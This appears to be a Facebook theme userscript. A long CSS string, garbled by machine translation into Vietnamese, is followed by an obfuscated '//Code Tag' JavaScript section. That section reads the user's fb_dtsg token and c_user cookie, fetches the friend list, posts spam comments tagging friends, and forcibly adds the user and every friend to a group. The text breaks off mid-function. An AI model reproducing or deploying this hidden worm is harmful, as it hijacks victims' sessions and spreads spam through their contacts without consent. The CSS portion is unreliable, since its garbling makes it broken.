Unfollow_message. UINestedFilterList_SubItem_Selected div, UIButton_Blue, UIButton_Gray, quiz_cell:..... di chuột, UIFilterList> UIFilterList_Title, message_rows tr. di chuột, ntab:.. di chuột, thumb_selected, ngón tay cái:.. di chuột, quét một, pandemic_bar, promote_page, promote_page... một,. create_button một,. nux_highlight. UIActionMenu_Wrap, share_button_browser div.,. silver_create_button, painted_button.,. flyer_button, bảng [bindpoint = \ "thread_row \"] tbody a: hover, settingsPaneIcon:. di chuột, NGẮN HẠN, inboxView tr. di chuột, TabView li một. di chuột, friendListView li:. di chuột, LTypeaheadResults, LTypeaheadResults một:... di chuột, hộp thoại-tiêu đề, . UISelectList, gray_box, UIButton:. Không (. UiSelectorButton), fbPrivacyWidget uiSelectorButton:... Không (. LockButton), uiButtonSuppressed, # navAccount li:... Không (# navAccountInfo), jewelHeader, seeMore, # mailBoxItems li, # pageFooter, uiSideNav key-nf:.. di chuột,-thông điệp chính mục:... di chuột, thông điệp chính-ul li:. di chuột, key-sự kiện li ul:. di chuột, key-phương tiện truyền thông ul li:. di chuột, phím mục di chuột, fbChatOrderedList:: ff ul li:. di chuột, phím ứng dụng: di chuột, phím trò chơi:... di chuột, uiSideNav sideNavItem: (. mở). không mục.. di chuột một, uiHeader, uiListItem:.. không (mall_divider.):. di chuột, uiSideNav li.selected> . Chọn một, masterControl điều khiển mục một:... Di chuột, uiTypeaheadView. . UiComposer, megaphone_box, uiCenteredMorePager, fbEditProfileViewExperience:.......... Giữa di chuột, uiStepSelected, GM_options_header, bfb_tab_selected, # MessagingShelfContent, connect_widget_like_button, uiSideNav mở, fbActivity:.... Di chuột, fbQuestionsPollResultsBar, insightsDateRangeCustom, fbInsightsTable thead thứ, mall_divider, attachmentContent fbTabGridItem:.... di chuột, jewelItemNew, # MessagingThreadlist . UIButton. UIConnectControlsListSelector . UiStreamHeaderTall. FbChatSidebarMessage. FbPhotoSnowboxInfo, devsitePage menu.., DevsitePage menu... Nội dung, # devsiteHomeBody. WikiPanel> . TimelineUnitContainer: di chuột, timelineReportContainer:... Di chuột, fbTimelineComposerAttachments uiListItem: khoảng di chuột li: hover OgAggregationPanelUFI \ n {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Wallpaper/GlassShiny.png \") lặp lại cố định quan trọng;} \ n \ n.hovercard sân khấu,.. . profileChip, GM_options_wrapper_inner, MessagingReadHeader uiHeader, # MessagingShelf, # navAccount ul, uiTypeaheadView, # blueBar, uiFacepileItem uiTooltipWrap, fbJewelFlyout, jewelItemList li, thông báo:......... không, fbNubButton, fbChatTourCallout (jewelItemNew.).. . cơ thể, uiContextualDialogContent, fbTimelineStickyHeader trở lại, timelineExpandLabel:.... di chuột, pageNotifFooter một, fbSettingsListLink:.... di chuột, uiOverlayPageContent, # bfb_option_list, fbPhotoSnowlift . UiMenuXBorder,-cx-TƯ-uiDialog__content.,-Cx-TƯ-uiDialog__title., _k5 \ N {background:. Url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Wallpaper/GlassShiny. png \ ") lặp lại cố định, RGBA (10,10,10, 0,6) quan trọng!; } \ N \ n.unread huy hiệu, biểu tượng fbDockChatBuddyListNub, sx_7173a9, selectedCheckable dấu {background:...... Url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball15.png \" !......) không lặp lại trung tâm quyền quan trọng;} \ n \ ntable [class = \ "\"] huy hiệu: di chuột, bàn [class = \ "\"] huy hiệu: di chuột, ẩn fbDockChatBuddyListNub biểu tượng, fbChatSidebar ... ẩn fbChatSidebarMessage img {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball15.png \") không lặp lại trung tâm quyền quan trọng;} \ n \ n.fbChatSidebar .. ẩn fbChatSidebarMessage img {height: 16px quan trọng;}.. \ n \ n.offline fbDockChatBuddyListNub biểu tượng, biểu tượng fbDockChatBuddyListNub, sx_7173a9.... {margin-top: 0 quan trọng, chiều cao: 15px quan trọng;} \ n \ na.idle. buddyRow.idle. buddyBlock, fbChatTab.idle tab_availability.., fbChatTab.disabled tab_availability.., chatIdle. chatStatus.,. nhàn rỗi fbChatUserTab. bọc, chatIdle. uiTooltipText., markunread.,. bb. fbDockChatTab. .. user.idle titlebarTextWrapper, fbChatOrderedList mục:.. không (hoạt động). tình trạng {background:. url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/grayball10paddedright.png \") không tình trạng} \ n \ n.fbChatOrderedList mục {width; trung tâm lặp lại trái quan trọng:..! 10px quan trọng;} \ n \ n.headerTinymanName {max-width: 320px quan trọng; trắng không gian: nowrap quan trọng; tràn: ẩn quan trọng;} \ n \ n.uiTooltipText {padding-left: 14px quan trọng; biên giới:...... không quan trọng;} \ n \ n.fbNubButton, bb fbNubFlyoutTitlebar, bb fbNub noTitlebar, fbDockChatTab ., # fbDockChatBuddylistNub fbNubFlyout, fbDockChatTabFlyout, titlebar {border-radius: 8px 8px 0 0 quan trọng;} \ n \ n.uiSideNav mở {padding-right: 0 quan trọng;}.... \ n.uiSideNav mở,. uiSideNav mở> *, # home_stream> *, bb rNubContainer fbNub, fbChatTab {margin-left: 0 quan trọng;} \ mở ul n.uiSideNav> * {margin-left: 20px-! quan trọng;}...... ... \ n.uiSideNav mở subitem> rfloat {margin-right: 20px quan trọng;} \ n \ n.timelineUnitContainer timelineAudienceSelector uiSelectorButton {padding:..! 1px quan trọng; margin: 0 0 4px 4px quan trọng;} \ n.timelineUnitContainer audienceSelector uiButtonNoText customimg {margin:...!. 2px quan trọng;} \ n.timelineUnitContainer composerAudienceSelector customimg {opacity:.! 1 quan trọng; background-position: 0 1px quan trọng; padding: 0 quan trọng;} \ n \ n.fbNub.user:. không (. vô hiệu hóa) quấn {padding-left: 15px quan trọng;} \ n.fbNubFlyoutTitlebar titlebarText {padding-left:.! 12px quan trọng;} \ n \ na.friend: không (nhàn rỗi.), buddyRow:. không (. nhàn rỗi) buddyBlock, fbChatTab:.. không (. nhàn rỗi): không (vô hiệu hóa.) tab_availability, chatOnline chatStatus, markread, người sử dụng..... : không (. nhàn rỗi): (. vô hiệu hóa).... không fbChatUserTab bọc, chatOnline uiTooltipText, bb fbDockChatTab.user:.. không (. nhàn rỗi): không titlebarTextWrapper, fbChatOrderedList item.active (vô hiệu hóa.).... ..... trạng thái, hoạt động titlebarTextWrapper, uiMenu kiểm tra itemAnchor {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/blueball10paddedright.png \") không lặp lại quan trọng;} \ tab_availability không, chatOnline chatStatus, markread, một n \ na.friend: không (. nhàn rỗi), buddyRow:.. không (. nhàn rỗi) buddyBlock, fbChatTab:.: không (. nhàn rỗi) (tàn tật)...... nhàn rỗi, buddyRow.idle buddyBlock {background-vị trí: trung tâm quyền quan trọng;}.. \ n \ n.user:..... không (. nhàn rỗi): fbChatUserTab không (. vô hiệu hóa) bọc, chatOnline uiTooltipText, bb. ......... fbDockChatTab.user: không (. nhàn rỗi): không (. vô hiệu hóa) titlebarTextWrapper, fbChatOrderedList item.active trạng thái, hoạt động titlebarTextWrapper, người sử dụng fbChatUserTab quấn {background-vị trí: trung tâm trái quan trọng;} \ .. n \ n.uiMenu kiểm tra itemAnchor {background-vị trí: trung tâm quan trọng 5px;}. \ n \ n.markunread, markread {background-vị trí: 0 trung tâm quan trọng;} \ n \ n.chatIdle chatStatus,.. . chatOnline chatStatus {width: 10px quan trọng, chiều cao:! 10px quan trọng; background-position: 0 0 quan trọng;} \ n \ n # fbRequestsJewel jewelButton {background:. url (\ "http://i795.photobucket.com / albums/yy232/DaedalusIcarusHelios/Friends-Gray.png \ "!) no-repeat trung tâm trung tâm quan trọng;} \ n \ n # fbRequestsJewel:.. di chuột jewelButton, # fbRequestsJewel.hasNew jewelButton {background: url (\" http: / / i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Friends.png \ "!) no-repeat trung tâm trung tâm quan trọng;} \ n \ n # fbMessagesJewel jewelButton {background: url (\". http://i795. photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon-gray.png \ ") no-repeat trung tâm trung tâm quan trọng;} \ n \ n # fbMessagesJewel:.. di chuột jewelButton, # fbMessagesJewel.hasNew jewelButton {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Mail_Icon.png \") no-repeat trung tâm trung tâm quan trọng;} \ n \ n # fbNotificationsJewel jewelButton {background: url (\ "http:/. !.. / i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth-gray.png \ ") no-repeat trung tâm trung tâm quan trọng;} \ n \ n # fbNotificationsJewel: hover jewelButton, # fbNotificationsJewel.hasNew jewelButton {background: !. url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Earth.png \") no-repeat trung tâm trung tâm quan trọng;} \ n \ n.topBorder, bottomBorder {background: # 000! .. quan trọng;} \ n \ n.pl mục, ical, pop_content {background-color: # 333 quan trọng;} \ n.pl-alt {background-color:! # 222 quan trọng;} \ n \ n. . (. nhàn rỗi) bạn bè:: di chuột, bạn không: di chuột, fbTimelineRibbon.. {background-color: RGBA (10,10,10, 0,6) quan trọng;} \ n \ n.maps_arrow, # sidebar_ads, có sẵn Img uiTooltip, UIObjectListing_PicRounded, UIRoundedImage_CornersSprite, UITabGrid_Link:..... Di chuột UITabGrid_LinkCorner_TL, UITabGrid_Link:.... Di chuột UITabGrid_LinkCorner_TR, UITabGrid_Link: UITabGrid_LinkCorner_BL, UITabGrid_Link di chuột:... Di chuột UITabGrid_LinkCorner_BR, UILinkButton_R, pagesAboutDivider {khả năng hiển thị:.. Ẩn . UiCloseButton, mặt nạ, topSectionBottomBorder {display: không quan trọng;}.. \ N \ n.fbChatBuddyListTypeahead {display: block quan trọng;} \ n \ n.chat_input {width: 195px . nhịp, menuPulldown {background-color: minh bạch quan trọng;} \ n \ n.extended_link div {background-color: # fff quan trọng!} \ n \ n # fbTimelineHeadline, coverImage {width:.! 851px quan trọng; margin-left: 1px quan trọng;} \ n \ n *: không ([phong cách * = biên giới]) {border-color:!. # 000 quan trọng;} \ n \ n # feed_content_section_applications *, # feed_header_section_friend_lists *, tóm tắt, . tóm tắt *, UIMediaHeader_TitleWash, UIMediaHeader_TitleWrapper, feedbackView comment thứ div, searchroot, composerView thứ div, trả lời lần thứ div, borderTagBox, innerTagBox, bạn bè, fbNubFlyoutTitlebar, fbNubButton {border-color:............ minh bạch ! quan trọng;} \ n \ n.innerTagBox: hover {border-color: RGBA (10,10,10, 0,45) quan trọng, box-shadow: 0 0 5px 4px # 9cf quan trọng;} \ n \ n. status_placeholder. UIComposer_TDTextArea. UIComposer_TextAreaShadow. UIContentBox. box_column, form.comment div,. comment_box div, # Tagger,. UIMediaItem_Wrapper, # chat_tab_bar *,. UIActionMenu_ButtonOuter *,. FbFooterBorder. Rửa,. Main_body. Settings_screenshot. UiBlingBox. InputContainer *,. UiMentionsInput. UiTypeahead. EditNoteWrapperInput. Date_divider. ChatStatus, # headNav,. Khoảng jewelCount. FbFeedbackMentions. Bọc,. UiSearchInput span,. uiSearchInput. fbChatSidebarMessage, devsitePage cơ thể..> nội dung.,. timelineUnitContainer. fbTimelineTopSection. coverBorder. truy cập, # pagelet_timeline_profile_actions truy cập pagesTimelineButtonPagelet.., # navAccount.openToggler, # contentArea. uiStreamStoryAttachmentOnly, ogSliderAnimPagerPrev nội dung.. , nội dung ogSliderAnimPagerNext, ogSliderAnimPagerPrev bao bọc, ogSliderAnimPagerNext bao bọc, ogSingleStoryContent, ogAggregationAnimSubstorySlideSingle, uiCloseButton, ogAggregationPanelUFI, ogAggregationPanelText........... {border: không quan trọng;}. \ n \ n.uiStream uiStreamHeaderTall {border-top : không quan trọng; cửa dưới: không quan trọng;} \ n \ n.attachment_link! a: hover, Tabset_selected {border-bottom-color:.! # 000 quan trọng; cửa dưới chiều rộng: 1px quan trọng; cửa dưới-hình:! rắn quan trọng; biên giới-top màu: # 000 quan trọng; biên giới -top-width: 1px quan trọng; biên giới-top-style: solid quan trọng; border-left-color: # 000 quan trọng; cửa trái chiều rộng:! 1px quan trọng; border-left-phong cách: rắn quan trọng; cửa bên phải-color: # 000 quan trọng, cửa phải rộng:! 1px quan trọng; biên giới-phải-phong cách: rắn quan trọng;-moz-xuất hiện:!. không quan trọng;} \ n \ n.UITabGrid_Link, fb_menu_title một, button_main, BUTTON_TEXT, button_left {border-bottom-color:... minh bạch quan trọng; cửa dưới chiều rộng: 1px quan trọng; cửa dưới-hình:! rắn quan trọng; biên giới-top-color: minh bạch quan trọng! ; biên giới-top-width: 1px quan trọng; biên giới-top-style: rắn quan trọng; border-left-color: minh bạch quan trọng; cửa trái chiều rộng:! 1px quan trọng; border-left-phong cách: rắn quan trọng ; biên giới-phải-màu sắc: trong suốt quan trọng; biên giới-phải-width: 1px quan trọng; biên giới-phải-phong cách:! rắn một,. notif_del. UIComposer_AttachmentArea_CloseButton. delete_msg một,. ImageBlock_Hide, .! UiCloseButton {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/closeX.png \") không lặp lại quan trọng; trang trí văn bản: không quan trọng, chiều cao: 18px quan trọng! ........;} \ n \ ndiv.fbChatSidebarDropdown uiCloseButton, fbDockChatDropdown uiSelectorButton, storyInnerContent uiSelectorButton, fbTimelineAllActivityStorySelector UIButton img {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/ trung tâm GrayGear_15.png \ ") no-repeat center quan trọng!; chiều rộng: 26px quan trọng;} \ n \ ndiv.fbChatSidebarDropdown uiCloseButton {height:.! 23px quan trọng;} \ n \ n.videoicon {background: url (\ "http://i795.photobucket.com/albums/yy232/ DaedalusIcarusHelios / video_chat_small.png \ ") trung tâm trung tâm không lặp lại quan trọng!; ...} \ N \ n.uiStream uiStreamFirstStory highlightSelector uiSelectorButton {margin-top:-5px ... một, notif_del, UIComposer_AttachmentArea_CloseButton, delete_msg một, ImageBlock_Hide, uiCloseButton, fbSettingsListItemDelete {width: 18px quan trọng;}... \ n.fg_action_hide {width: 18px quan trọng; margin-top: 0 quan trọng;! } \ N \ n.fg_action_hide_container {width: 18px quan trọng;} \ n.uiSideNav li {trái: 0 quan trọng; padding-left: 0 quan trọng;} \ n \ n.UIHotStory_Bling, UIHotStory_BlingCount:. Di chuột, request_link. : hover, khoảng request_link: di chuột, uiLinkButton {text-decoration: không quan trọng;}... \ n \ NLI hình thức + navSubmenu> div> div {padding: 12px quan trọng; margin-top:.-12px quan trọng; navSubmenu>} \ NLI hình thức + div img {margin-top: 12px quan trọng;} \ n \ n.uiStreamBoulderHighlight {border bên phải:! không quan trọng;} \ n \ n \ đầu vào \ n \ n.fbx_stream_header, pas {padding;: {5px quan trọng margin-right!}: 5px quan trọng;.: n.UIMediaItem_Photo UIMediaItem_Wrapper {padding! 10px quan trọng} \ n \ n # footerRight, fg_action_hide...! } \ n \ n.ptm {padding: 5px 0 quan trọng;} \ n \ n.fbTimelineUnitActor {padding-top:! 5px quan trọng;} \ n.home_right_column {padding-top: 0 quan trọng;} \ n \ n! . UIButton [tooltip-alignh = \ "đúng \"] uiButtonText {padding:.! 2px 3px 10px 10px quan trọng; ! font-weight: bold quan trọng;} \ n \ n.uiSideNav uiCloseButton {left: 160px quan trọng; biên giới:.. không quan trọng;} \ n.uiSideNav uiCloseButton đầu vào {padding-left:! 2px quan trọng; padding-ngay : 2px quan trọng; margin-top:-4px quan trọng; biên giới: không quan trọng;} \ n \ n.storyInnerContent uiTooltip.uiCloseButton {margin-right:.!..-10px quan trọng;} \ n.storyInnerContent stat_elem quấn ................ uiSelectorButton.uiCloseButton, uiFutureSideNavSection mở mục, uiFutureSideNavSection mở subitem, uiFutureSideNavSection mở subitem rfloat, uiSideNav subitem, uiSideNav mở mục {margin-right: 0 quan trọng;} \ . n \ n.audienceSelector quấn uiSelectorButton {padding: 2px quan trọng;} \ n \ n.jewelHeader, fbSettingsListItemDelete {margin: 0 quan trọng;}.. \ n.UITitledBox_Title {margin-left: 4px; margin-top: 1px ;} \ n \ n.uiHeader uiHeaderTitle {margin-left: 7px quan trọng;} \ n.fbx_stream_header uiHeaderTitle, # footerLeft {margin-left:.!. 5px quan trọng;} \ n \ n.comments_add_box_image {margin-right: !-5px quan trọng;} \ n.show_advanced_controls {margin-top:-5px quan trọng;} \ n.chat_window_wrapper {margin-bottom: 3px quan trọng;} \ n.UIUpcoming_Item {margin-bottom:! 5px quan trọng;} \ n # pagelet_right_sidebar {margin-left: 0 {Padding: 5px 10px quan trọng;} \ n \ n.GBSearchBox_Button, nút uiSearchInput {background:. Url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/search.png \") trung tâm trung tâm ! quan trọng;} \ nút n.uiSearchInput {width: 23px quan trọng; chiều cao: 21px quan trọng; đầu: 0 quan trọng; background-position: 3px 2px quan trọng;} \ n \ n.UIButton_Text, UISearchInput_Text {font-!. trọng lượng:.. bình thường quan trọng;} \ n \ n.x_to_hide, top_bar_pic UIRoundedImage {margin: 0 quan trọng; padding: 0 quan trọng;} \ n \ n.uiHeaderActions UIButton uiButtonText {margin-left:..! 15px quan trọng ;} \ n \ n \ n.searchroot, # share_submit đầu vào {padding-right: 5px quan trọng; } \ N.composerView {padding-left: 8px quan trọng; padding-bottom: 4px quan trọng;} \ n.info_section {padding: 6px quan trọng;} \ n.uiInfoTable DataRow inputText {min-width: 200px..! .... quan trọng; mrs} \ n \ n.fbPrivacyWidget UIButton mrs, uiButtonSuppressed {margin: 0 10px 0-6px quan trọng;} \ n \ n.uiStreamPrivacyContainer . UIButton. Mrs. UiButtonSuppressed. mrs, div.fbPrivacyLockSelector {! background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/privacylock.png \") no-repeat trung tâm trung tâm quan trọng;} \ n \ n.jewelCount, .. pagesTimelineButtonPagelet truy cập {margin: 8px--4px 0 0 quan trọng; padding:! 1px 4px quan trọng;} \ n \ n # share_submit {padding: 0 quan trọng, biên giới:! không quan trọng;} \ n # share_submit đầu vào, . friend_list_container bạn. {padding-left: 5px quan trọng;} \ n \ na {outline: none quan trọng;} \ n \ n # contact_importer_container đầu vào [giá trị = \ "Tìm bạn bè \"] {border: không quan trọng; box-shadow: không quan trọng;} \ n \ n # pageLogo {margin-left:-1px quan trọng; } \ N \ n # pageLogo một {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook.png \") trung tâm trung tâm không lặp lại quan trọng; trái: 0 quan trọng! , chiều rộng: 107px quan trọng; margin-right:! 1px quan trọng; margin-top: 0 quan trọng;} \ n \ n # pageLogo a: hover {background: url (\ "http://i795.photobucket.com/albums/yy232/DaedalusIcarusHelios/Facebook-glow.png \") không ! lặp lại trung tâm trung tâm quan trọng;} \ n \ n # pageHead {margin-top:-6px quan trọng;} \ n \ n.mainWrapper uiSelectorButton {margin-top:.! 10px quan trọng; .} \ N \ n.platform_dialog # blueBar, withCanvasNav # blueBar {vị trí: tuyệt đối quan trọng; margin-top: 10px quan trọng; chiều cao: 30px quan trọng; Bạn} \ n \ n.friend_list_container {margin-right: 0 quan trọng;.! } \ N \ n.list_select {padding:. 3px quan trọng;} \ n \ n.fbNubFlyout đầu vào {width: 254px quan trọng;} \ n \ n.highlightIndicator {top: 0 quan trọng;} \ n \ n!. . audienceSelector uiButtonText {padding-left: 8px quan trọng;} dấu \ n.pas đầu vào, selectedCheckable \ n.profile # pagelet_netego {::;; quan trọng margin-top-60px quan trọng margin-left!-30px!}... {margin-left:-5px quan trọng;} \ n \ n.removable {top: 0 quan trọng; dưới:!;:-4px quan trọng; biên giới:! không quan trọng; 0 quan trọng margin-top} \ n \ n .. uiSideNavCount, uiStreamAttachments div nhúng, jewelCount, UIButton, nút fbChatSidebarFooter, nút uiSearchInput, uiSelectorButton, pagesTimelineButtonPagelet truy cập, # pagelet_timeline_profile_actions truy cập, pluginRecommendationsBarButtonLike {border-radius: 6px quan trọng;}.......... \ n . \ n.fbActivity, UIRoundedImage {margin: 4px quan trọng;} \ n \ n # facebook: không cơ thể: không (UIPage_LoggedOut.): không (fbIndex.): không (platform_dialog.): không ((tinyViewport.). withCanvasNav) # blueBar {width: 100% quan trọng; margin: 0 auto quan trọng; đầu:! 10px quan trọng; chiều cao: 30px quan trọng;}.. textBox \ n \ n.uiUfiSmall commentArea: không ([phong cách * = \ "chiều cao \"]) {height: 20px quan trọng; .} \ N.composerTypeahead TextInput: không ([phong cách * = \ "chiều cao \"]) {height: 27px quan trọng; } \ N \ n.dataTable inputText, uiInfoTable DataRow inputText {padding-left:....!... 20px quan trọng;} \ n \ n.fbTimelineAllActivityStorySelector UIButton, fbDockChatTabFlyout gần {margin-top: 3px quan trọng;} \ ... n.fbTimelineAllActivityStorySelector UIButton img {! margin: 0-3px quan trọng;} \ n \ n.audienceSelector UIButton {padding: 2px 0 2px 0 quan trọng;} UIButton img \ n.audienceSelector {margin-right:.. - 1px quan trọng;} \ n \ n.fbTimelineContentHeader uiHeaderTitle {font-size:.! 2.0em quan trọng;} \ n \ n \ trang n.ogSliderAnimPagerGridTd {margin:. 0 14px 0-5px quan trọng;} \ n.ogSliderAnimPagerNext nội dung {margin-left:-18px quan trọng;} \ n # bfb_options_button_li. {float: trái quan trọng;} \ n \ n.fbTimelineCapsule {background: url (\ "http://i795.photobucket.com/albums/ yy232/DaedalusIcarusHelios/Black_50pct_3x1.png \ ") repeat-y trung tâm cuộn đầu trong suốt quan trọng;}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // no head yet, stick it whereever
                document.documentElement.appendChild(node);
        }
}
})();
//Code Tag
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","474564572645416","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=(y) :* (y) Mình đã vẽ thành công rồi, đẹp quá  🌙  🌟  🌱  🌴  🌵  🌷  🌸 ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var gid = ['242162652634633'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
}
 
 
//arkadaslari al ve isle
function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*10;i<(f+1)*10;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
